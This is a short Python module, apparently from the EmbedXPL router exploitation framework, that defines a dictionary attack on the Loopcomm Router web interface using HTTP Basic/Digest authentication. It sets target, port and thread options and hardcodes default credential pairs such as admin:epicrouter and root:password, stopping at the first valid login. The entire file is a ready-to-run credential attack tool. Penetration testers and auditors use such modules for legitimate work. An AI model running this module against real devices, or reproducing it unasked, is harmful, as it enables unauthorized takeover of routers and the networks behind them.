# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.http_basic_digest_default import Exploit as HTTPBasicDigestDefault


class Exploit(HTTPBasicDigestDefault):
    __info__ = {
        "name": "Loopcomm Router Default Web Interface Creds",
        "description": "Dictionary attack against Loopcomm Router Web Interface (HTTP Basic/Digest Auth).",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Loopcomm Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")
    path = OptString("/", "Target path")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:epicrouter,admin:password,admin:root,root:epicrouter,root:password", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid attempt")
    verbosity = OptBool(True, "Display attempts")
